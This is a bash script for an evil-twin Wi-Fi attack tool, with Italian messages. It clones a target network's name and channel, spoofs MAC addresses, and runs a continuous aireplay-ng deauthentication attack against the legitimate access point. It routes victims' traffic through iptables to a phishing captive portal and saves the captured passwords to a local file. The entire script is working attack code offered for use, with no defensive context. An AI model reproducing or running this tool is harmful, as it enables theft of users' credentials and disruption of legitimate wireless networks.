#!/bin/bash
set -o noclobber

if [[ $EUID -ne 0 ]]; then
   echo ""
   echo "Please run as root"
   exit 1
fi

dmesg -D # Remove verbose log in tty's

tool_program="$(echo "$0" | sed -se 's/.*\///; s/\.sh$//')"
PID="$(pgrep "$tool_program".sh)"
config_apache="default.conf"
tmp_dir="/tmp/$tool_program"
tmp_dir_config="$tmp_dir/config"
LOG="$tmp_dir/rogueportal.log"
i_wireless=""
i_deauth=""
i_connect=""
password=""
essid=""
mon_deauth=""
channel="$(($((RANDOM % 11)) + 1))" # Default
persistent_connection=0             # Mantiene la connessione attiva permettendo al client di poter navigare in internet sul nostro AP malevolo
mac_device=""                       # Mac address dell'interfaccia di rete
mac_device_deauth=""                # Mac address dell'interfaccia di rete di deauth
mac_target=""                       # Mac address di destinazione
mac_chng=""                         # Mac address fake
ssid_portal=""
clone=0
attack=0
phishing_page=0
page_p=()
for page in $(cd "$PWD"/phishing_pages* && ls -dx1 */); do page_p+=("$page"); done
check_decoration="\033[0;32m\xE2\x9C\x94\033[0m"
check_decoration_error="\033[1;31m\xE2\x9D\x8C\033[0m"

function logo() {

   cat <<EOF
 _________.                            ___.
 \______   \ ____   ____  __ __   ____/  _ \___________._.______._______.___
  |       _//  _ \ / ___\|  |  \./ __ \ <_> \   . \ <_> )\__   __\  <_>  \  \\
  |    |   (  <_> ) /_/  >  |  /\  ___/\   / \ <_> \   _/_  \  \  \   _   \  \__.
  |____|_  /\____/\___  /|____/  \___  >\  \  \_____\  \  \  \_/   \___\\___\_____\\
         \/      /_____/             \/  \_/         \_/\_/

                * A Phishing WIFI Rogue Captive Portal! Enjoy! *

EOF

}

function help() {
   echo " Usage: $0 -w [Interfaccia hotspot] -e [AP network name/target] -f [Pagina phishing] -i [Interfaccia collegata a internet]"
   echo ""
   echo " -w		Interfaccia da utilizzare come Access Point"
   echo " -e		ESSID della rete o della rete da attaccare"
   echo " -f 		Numero pagina di phishing. Accetta solo valore numerico"
   echo " -i             Interfaccia collegata ad internet"
   echo ""
   echo " [ OPTIONAL ]"
   echo ""
   echo " -l		Lista delle pagine di phishing disponibili"
   echo " -c		Canale della rete"
   echo " -m		Mac address da utilizzare"
   echo " -C		Imposta la clonazione dell'AP se trova l'essid nelle vicinanze, impostato con"
   echo "                l'opzione '-e',"
   echo " -p		Mantiene la connessione dopo aver catturato le password. Di default lo script"
   echo "		si chiude automaticamente"
   echo " -a		Attacco deauth contro l'AP legittimo, impostato con '-e'. Come argomento,"
   echo "                necessita di un interfaccia per il deauth"
   echo ""
}

function control_c_sigterm() {
   echo ""
   echo -e "\e[91mCTRL C Detected! Kill $PID ($tool_program)\e[0m"
   echo -e "\e[91mExiting!\e[0m"
   cleanup
   exit $?
}

function flush_services() {
   service dnsmasq stop &>/dev/null
   service hostapd stop &>/dev/null
   service NetworkManager stop &>/dev/null
   service wicd stop &>/dev/null

   echo -e "\e[32m- Killing dnsmasq\e[0m"
   killall dnsmasq &>/dev/null

   echo -e "\e[32m- Killing hostapd\e[0m"
   killall hostapd &>/dev/null
}

function cleanup() {
   echo -en "\e[91mCleaning up and exiting\e[0m\n\n"

   if [[ -n $attack ]]; then
      echo -e "\e[32m- Stop monitor mode $mon_deauth\e[0m"
      killall aireplay-ng
      airmon-ng stop "$mon_deauth" &>/dev/null
   fi

   echo -e "\e[32m- Flush iptables\e[0m"
   flush_iptables

   flush_services

   flush_device

   if [[ -n $mac_chng ]]; then
      echo -e "\e[32m- Remove fake mac address\e[0m"
      ifconfig "$i_wireless" down
      macchanger -m "$(macchanger wlan0 | grep -i permanent | cut -d' ' -f3)" "$i_wireless" &>/dev/null
   fi

   a2dissite $config_apache &>/dev/null
   a2ensite 000-default.conf &>/dev/null

   service apache2 restart &>/dev/null

   if [ -d /var/www/html/data/"$page_phishing" ] && [ -f /var/www/html/data/"$page_phishing"/credentials.txt ]; then
      echo -e "\n\e[32m[ * ]\e[0m \e[91mSono state catturate delle password! ($(du /var/www/html/data/"$page_phishing"/credentials.txt | sed -s 's/[[:space:]]/ /' | cut -d" " -f 1)KB)\e[0m"
      mkdir "$PWD"/captured_credentials &>/dev/null
      set +o noclobber
      cat /var/www/html/data/"$page_phishing"/credentials.txt | sort | uniq >>"$PWD"/captured_credentials/credentials.txt
      set -o noclobber
   else
      echo -e "\n\e[91m[ ! ] Nessuna password catturata\e[0m"
   fi

   rm -rf /var/www/html/data
   rm -rf "$tmp_dir"

   sync
   dmesg -E

   exit $?
}

function flush_iptables() {
   iptables -t nat -F
   iptables -t nat -X
   iptables -t nat -Z

   iptables -t mangle -F
   iptables -t mangle -X
   iptables -t mangle -Z

   iptables -F
   iptables -X
   iptables -Z
}

function flush_device() {
   rfkill unblock all
   killall -g wpa_supplicant &>/dev/null
   dhclient -r &>/dev/null

   ifdown $i_wireless &>/dev/null
   ifconfig $i_wireless down &>/dev/null
   ip addr flush dev $i_wireless &>/dev/null
   ifconfig $i_wireless up

   ifdown $i_connect &>/dev/null
   ifconfig $i_connect down &>/dev/null
   ip addr flush dev $i_connect &>/dev/null
   ifconfig $i_connect up

   if [[ -n "$i_deauth" ]]; then
      ifdown $i_deauth &>/dev/null
      ifconfig $i_deauth down &>/dev/null
      ip addr flush dev $i_deauth &>/dev/null
      ifconfig $i_deauth up
   fi

   airmon-ng check kill &>/dev/null
}

function mac_change() {
   flush_device
   ifconfig $i_wireless down
   macchanger --mac $mac_chng $i_wireless &>/dev/null
   ifconfig $i_wireless up
}

function a_deauth() {
   echo -e "\e[32m* Enabling monitor mode '$i_deauth'\e[0m"
   airmon-ng start $i_deauth &>/dev/null

   mon_deauth="$(for i_mon in /sys/class/net/*; do echo "$i_mon" | grep mon | sed 's/.*\///' | sed 's/://'; done)"

   # Attack Deauth all client for AP
   echo -e "\e[32m* Starting attack '$ssid_portal($mac_target)'\e[0m"

   iw dev "$mon_deauth" set channel $channel
   aireplay-ng -0 0 -a "$mac_target" "$mon_deauth" </dev/null &>/dev/null &
   disown
}

function rules_iptables() {
   set +o noclobber
   echo 1 >/proc/sys/net/ipv4/ip_forward
   set -o noclobber

   iptables -t mangle -N captiveportal
   iptables -t mangle -A PREROUTING -i $i_wireless -p udp --dport 53 -j RETURN
   iptables -t mangle -A PREROUTING -i $i_wireless -j captiveportal
   iptables -t mangle -A captiveportal -j MARK --set-mark 1
   iptables -t nat -A PREROUTING -i $i_wireless -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
   iptables -t nat -A PREROUTING -i $i_wireless -p tcp -j DNAT --to-destination 10.0.0.1:80
   iptables -A FORWARD -i $i_wireless -j ACCEPT
   iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Check Dependecies

if ! command -v aircrack-ng &>/dev/null || ! command -v dnsmasq &>/dev/null || ! command -v apache2 &>/dev/null || ! command -v hostapd &>/dev/null || ! command -v iwlist &>/dev/null || ! command -v php &>/dev/null || ! command -v macchanger &>/dev/null || ! command -v nohup &>/dev/null || ! command -v sudo &>/dev/null || ! command -v killall &>/dev/null || ! command -v rfkill &>/dev/null; then
   echo "Mancano alcune dipendenze. Installale prima di continuare"
   exit 1
fi

logo

[ $# -eq 0 ] && {
   help
   exit 1
}

while getopts "i:w:e:a:Cf:m:c:lp" arg; do
   case $arg in

   i)
      i_connect=$OPTARG

      find /sys/class/net ! -type d | grep "\<$i_connect\>" &>/dev/null

      if [ "$?" != "0" ]; then
         echo "Interfaccia '$i_connect' non trovata"
         exit 1
      fi
      ;;
   w)
      i_wireless=$OPTARG
      find /sys/class/net ! -type d | grep "\<$i_wireless\>" &>/dev/null

      if [ "$?" != "0" ]; then
         echo "Interfaccia '$i_wireless' non trovata"
         exit 1
      fi

      phy_wireless="$(iw dev | grep -B1 "$i_wireless" | head -n 1 | tr -d '#')"

      iw "$phy_wireless" info | grep -E '\<AP\>$' &>/dev/null

      if [ "$?" != "0" ]; then
         echo "A quanto pare il device '$i_wireless' non supporta la modalità AP (AccessPoint)"
         exit 1
      fi

      mac_device="$(ifconfig "$i_wireless" | grep -A1 "$i_wireless" | grep ether | sed 's/^[[:space:]]*//' | cut -d" " -f 2)"
      ;;
   e)
      ssid_portal=$OPTARG
      ;;
   l)
      echo -e "Trovate le seguenti pagine di phishing:\n"
      echo "${page_p[@]}" | sed -se 's/\///g; s/[[:space:]]/\n/' | awk '{ print"\t\t(" NR-1 ") " $0}'
      echo ""
      exit 0
      ;;
   a)
      attack=1
      i_deauth="$OPTARG"

      find /sys/class/net ! -type d | grep "\<$i_deauth\>" &>/dev/null

      if [ "$?" != "0" ]; then
         echo "Interfaccia '$i_deauth' non trovata"
         exit 1
      fi

      phy_wireless="$(iw dev | grep -B1 "$i_deauth" | head -n 1 | tr -d '#')"

      iw "$phy_wireless" info | grep -E "\<monitor\>$" &>/dev/null

      if [ "$?" != "0" ]; then
         echo "A quanto pare il device '$i_deauth' non supporta il monitor mode"
         exit 1
      fi

      mac_device_deauth="$(ifconfig "$i_deauth" | grep -A1 "$i_deauth" | grep ether | sed -s 's/^[[:space:]]*//' | cut -d" " -f 2)"
      ;;
   c)
      channel=$OPTARG
      ;;
   m)
      mac_chng=$OPTARG
      ;;
   C)
      clone=1
      ;;
   p)
      persistent_connection=1
      ;;
   f)
      phishing_page=$OPTARG

      echo "$phishing_page" | grep -E "^[0-9]" &>/dev/null

      if [ "$?" != "0" ]; then
         echo "Questa opzione accetta solo valori numerici"
         exit 1
      fi

      if [ "${page_p[$phishing_page]}" == "" ]; then
         echo "Non è stata trovata nessuna pagina di phishing con questo indicativo($OPTARG)"
         exit 1
      fi

      page_phishing=$(echo "${page_p[$phishing_page]}" | sed 's/\///')
      ;;
   *)
      help
      exit 1
      ;;
   esac
done

if [[ $OPTIND -eq 1 ]]; then
   help
   exit 1
fi

shift "$((OPTIND - 1))"

if [ -z "$ssid_portal" ]; then
   echo "Impostare l'ESSID della rete"
   exit 1
fi
if [ -z "$i_wireless" ]; then
   echo "Impostare un interfaccia wireless"
   exit 1
fi
if [ -z "$phishing_page" ]; then
   echo "Impostare una pagina di phishing"
   echo "Digita '$0 -l'"
   exit 1
fi
if [ -z "$i_connect" ]; then
   echo "Prima devi connetterti ad una rete"
   exit 1
fi

rm -rf /var/www/html/data
rm -rf "$tmp_dir"

mkdir -p "$tmp_dir_config" &>/dev/null

echo "$PID" >"$tmp_dir"/"$tool_program".pid && chown www-data:www-data "$tmp_dir"/"$tool_program".pid

if [ "$?" != "0" ]; then
   echo "Errore nel creare la cartella temporanea in /tmp"
   exit 1
fi

flush_services &>/dev/null
flush_device
flush_iptables

#Connessione ad una rete

if [ -d "/sys/class/net/$i_connect/wireless" ]; then

   count=0
   list_wifi="$(iwlist "$i_connect" scan | grep ESSID | unexpand | sed 's/^[[:space:]]*//' | cut -d":" -f 2)"

   IFS=$'\n'
   for essid in $list_wifi; do
      count=$((count + 1))
      echo -e "\t($count) $essid"
   done
   echo ""

   while
      read -rp "* Scrivi il nome della rete a cui vuoi connetterti: " essid

      if [[ -n $essid ]]; then
         break
      fi
   do :; done

   if [ "$ssid_portal" == "$essid" ] && [[ "$attack" -eq 1 ]]; then
      echo "Non puoi connetterti ad una rete che devi attaccare!"
      exit 1
   fi

   while
      prompt="* Inserisci la password della rete: "

      unset password
      unset digit
      unset count
      unset length_passwd

      count=0
      length_passwd=0
      while IFS= read -p "$prompt" -r -s -n1 digit; do
         if [[ $digit == $'\0' ]]; then
            break
         fi
         if [[ $digit == $'\177' ]]; then
            if [[ $count -gt 0 ]]; then
               count=$((count - 1))
               prompt=$'\b \b'
               password="${password%?}"
            else
               prompt=''
            fi
         else
            count=$((count + 1))
            prompt='*'
            password+="$digit"
         fi
      done

      length_passwd=${#password}
      if [ "$password" != "" ] && [[ $length_passwd -ge 8 ]]; then
         break
      fi
      echo ""
   do :; done
   echo ""

   wpa_passphrase "$essid" "$password" >"$tmp_dir_config"/wpa.conf

   # Check driver nl80211 o wext con wpa_supplicant
   # nl80211
   wpa_supplicant -Dnl80211 -i "$i_connect" -c "$tmp_dir_config"/wpa.conf -d -f "$tmp_dir"/wpa.log -B
   if [ "$?" != "0" ]; then
      # wext
      wpa_supplicant -Dwext -i "$i_connect" -c "$tmp_dir_config"/wpa.conf -d -f "$tmp_dir"/wpa.log -B
      if [ "$?" != "0" ]; then
         echo -e "\nQuesta interfaccia($i_connect) non puo' essere inizializzata per il collegamento"
         echo "con l'utility wpa_supplicant"
         exit 1
      fi
   fi

   while read -r check_pwd; do
      echo "$check_pwd" | grep "pre-shared key may be incorrect" &>/dev/null

      if [ "$?" == "0" ]; then
         killall -g wpa_supplicant
         echo -e "$check_decoration_error Password non corretta!"
         exit 1
      fi

      echo "$check_pwd" | grep -E "Connection to .* completed" &>/dev/null
      if [ "$?" == "0" ]; then
         break
      fi
   done < <(tail -f "$tmp_dir"/wpa.log) 2>/dev/null

   dhclient "$i_connect" &>/dev/null
   if [ "$?" != "0" ]; then
      echo "C'e' stato un problema nell'acquisire le informazioni dal DHCP."
      echo "Se l'errore persiste, prova il collegamento manuale."
      echo "In caso che l'errore persite, scollega e ricollega l'interfaccia"
      exit 1
   fi

else

   number=0
   ip=""
   netmask=""
   gateway=""
   dns=""

   echo ""
   echo "Rilevata interfaccia ethernet"
   echo ""
   echo "[1] Ottieni i dati della connessione tramite DHCP"
   echo "[2] Imposta la connessione manualmente"
   echo ""

   while
      read -rp "Come desideri procedere?(1-2): " number

      if [[ "$number" == 1 ]] || [[ "$number" == 2 ]]; then
         break
      fi
   do :; done

   case $number in
   1)
      dhclient "$i_connect" &>/dev/null
      if [ "$?" != "0" ]; then
         echo "C'e' stato un problema nell'acquisire le informazioni dal DHCP."
         echo "Se l'errore persiste, prova il collegamento manuale."
         echo "In caso che l'errore persite, scollega e ricollega l'interfaccia"
         exit 1
      fi
      ;;
   2)
      read -rp "Inserisci l'indirizzo IP: " ip
      read -rp "Inserisci il gateway: " gateway
      read -rp "Inserisci la maschera di rete: " netmask
      read -rp "Inserisci il DNS(default 8.8.8.8): " dns

      ifconfig "$i_connect" "$ip" netmask "$netmask"
      route add default gw "$gateway"

      if [[ -z "$dns" ]]; then
         dns="8.8.8.8"
      fi

      set +o noclobber      
      echo "nameserver $dns" >/etc/resolv.conf
      set -o noclobber
      ;;
   esac
fi

# CHECK CONNECTION

echo -ne "\r* Check connessione..."
ping -c 2 -W 3 www.google.it &>/dev/null
sleep 1
ping -c 2 -W 3 www.google.it &>/dev/null

if [ "$?" != "0" ]; then
   echo -en "\r$check_decoration_error A quanto pare non sei connesso\n"
   exit 1
else
   echo -e "\r$check_decoration Connessione riuscita!"
fi

trap control_c_sigterm SIGINT

if [[ "$clone" -eq 1 ]]; then
   iwlist "$i_wireless" scan | grep ESSID | grep -E "\<$ssid_portal\>" &>/dev/null

   if [ "$?" != "0" ]; then
      echo "Non c'è nessun AP con un ESSID '$ssid_portal'"
      exit 1
   fi

   # Getting information of AP TARGET
   if [[ $attack -eq 1 ]]; then
      ssid_portal="$(iwlist "$i_deauth" scan | grep -Ei 'ssid' | grep "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -i essid | sed -s 's/\"//g' | cut -d':' -f 2)"
      channel="$(iwlist "$i_deauth" scan | grep -Ei 'ssid|channel|address' | grep -B4 "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -Ei ^channel | cut -d':' -f 2)"
      mac_target="$(iwlist "$i_deauth" scan | grep -Ei 'ssid|channel|address' | grep -B4 "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -i addres | cut -d' ' -f 5)"
   else
      ssid_portal="$(iwlist "$i_wireless" scan | grep -Ei 'ssid' | grep "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -i essid | sed -s 's/\"//g' | cut -d':' -f 2)"
      channel="$(iwlist "$i_wireless" scan | grep -Ei 'ssid|channel|address' | grep -B4 "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -Ei ^channel | cut -d':' -f 2)"
      mac_target="$(iwlist "$i_wireless" scan | grep -Ei 'ssid|channel|address' | grep -B4 "$ssid_portal" | sed -s 's/[[:space:]]*//' | grep -i addres | cut -d' ' -f 5)"
   fi

fi

if [[ $attack -eq 1 ]] && [[ $clone -eq 0 ]]; then
   echo "Per l'attacco è necessario l'opzione '-C'"
   exit 1
fi

echo ""
if [ "$mac_target" != "" ]; then
   printf "\e[91mESSID:'%s(%s)'" "$ssid_portal" "$mac_target"
else
   printf "\e[91mESSID:'%s'" "$ssid_portal"
fi

printf ", CANALE:'%s', INTERFACCIA AP:'%s(%s)'" "$channel" "$i_wireless" "$mac_device"

if [[ -n $mac_device_deauth ]]; then
   printf ", INTERFACCIA DEAUTH:'%s(%s)'" "$i_deauth" "$mac_device_deauth"
fi

printf ", PISHING PAGE:'%s'\e[0m" "$(echo "$page_phishing" | tr 'a-z' 'A-Z')"
echo -e "\n"

sleep 2

if [[ -n $mac_chng ]]; then
   echo -e "\e[32m* Change mac in '$mac_chng' address for device '$i_wireless'"
   mac_change
fi

echo -e "\e[32m+ Creating hostapd.conf\e[0m"
cat core/hostapd.conf |
   sed "s/\$i_wireless$/${i_wireless}/" |
   sed "s/\$ssid_portal$/${ssid_portal}/" |
   sed "s/\$channel$/${channel}/" >"$tmp_dir_config"/hostapd.conf

echo -e "\e[32m+ Creating dnsmasq.conf\e[0m"
cat core/dnsmasq.conf |
   sed "s/\$i_wireless$/${i_wireless}/" >"$tmp_dir_config"/dnsmasq.conf

echo -e "\e[32m+ Creating apache2 site for '$(echo "$page_phishing" | tr 'a-z' 'A-Z')' phishing page\e[0m"
set +o noclobber
cat core/default.conf |
   sed "s/\$phishing_page$/${page_phishing}/" >/etc/apache2/sites-available/"$config_apache"
set -o noclobber

mkdir /var/www/html/data &>/dev/null

if [ "$?" != "0" ]; then
   echo "Errore nella creazione della cartella 'data' in /var/www/html/"
   exit 1
fi

cp -R "$PWD"/phishing_pages/"$page_phishing" /var/www/html/data/

# Check persistence connection
if [[ $persistent_connection -eq 1 ]]; then
   cp core/db_evilconnect_persistent.php /var/www/html/data/"$page_phishing"/db_evilconnect.php
else
   cp core/db_evilconnect.php /var/www/html/data/"$page_phishing"/db_evilconnect.php
fi

chown www-data:www-data -R /var/www/html/data
chmod 777 -R /var/www/html/data/*

a2dissite 000-default.conf &>/dev/null
a2ensite "$config_apache" &>/dev/null

echo -e "\e[32m* Configuring $i_wireless\e[0m"
ifconfig "$i_wireless" 10.0.0.1 netmask 255.255.255.0

echo -e "\e[32m* Starting apache\e[0m"
service apache2 restart

echo -e "\e[32m* Adding routes to iptables\e[0m"
rules_iptables

echo -e "\e[32m* Starting dnsmasq\e[0m"
dnsmasq -C "$tmp_dir_config"/dnsmasq.conf

if [ "$?" != "0" ]; then
   kill -SIGINT "$PID"
   echo "Problema nell'avviare dnsmasq"
   exit 1
fi

echo -e "\e[32m* Starting hostapd (log in $tmp_dir/hostapd.log)\e[0m"
: >"$LOG"
hostapd -B "$tmp_dir_config"/hostapd.conf -f "$LOG" -t

if [ "$?" != "0" ]; then
   kill -SIGINT "$PID"
   echo "Problema nell'avviare hostapd. Controlla se la scheda di rete non è gia in uso o supporta il driver 'nl80211'"
   exit 1
fi

if [[ $attack -eq 1 ]]; then
   a_deauth
fi

echo -e "\n"

tail -f "$LOG" | while read -r CLIENT; do
   echo "$CLIENT" | grep AP-STA-CONNECTED &>/dev/null

   if [ "$?" == "0" ]; then
      printf "\e[32m[ %s $(date +%d/%m/%Y"-"%H:%M) ]  New client $(echo "$CLIENT" | grep AP-STA-CONNECTED | cut -d" " -f 4) connected!\e[0m" "$tool_program"
      vendor="$(echo "$CLIENT" | grep AP-STA-CONNECTED | cut -d' ' -f 4 | sed -s 's/://g' | tr 'a-f' 'A-F' | cut -c 1-6)"
      echo -e "\e[32m    ( $(cat mac_vendor.txt | grep "$vendor" | sed -s 's/[[:space:]]/\t/' | cut -f2-) )\e[0m"
   fi

   echo -e $'\r'"$CLIENT" | grep AP-STA-DISCONNECTED &>/dev/null

   if [ "$?" == "0" ]; then
      printf "\e[32m[ %s $(date +%d/%m/%Y"-"%H:%M) ]\e[0m\e[91m Client $(echo "$CLIENT" | grep AP-STA-DISCONNECTED | cut -d" " -f 4) disconnected!\e[0m" "$tool_program"
      vendor="$(echo "$CLIENT" | grep AP-STA-DISCONNECTED | cut -d' ' -f 4 | sed -s 's/://g' | tr 'a-f' 'A-F' | cut -c 1-6)"
      echo -e "\e[32m    ( $(cat mac_vendor.txt | grep "$vendor" | sed -s 's/[[:space:]]/\t/' | cut -f2-) )\e[0m"
   fi

done
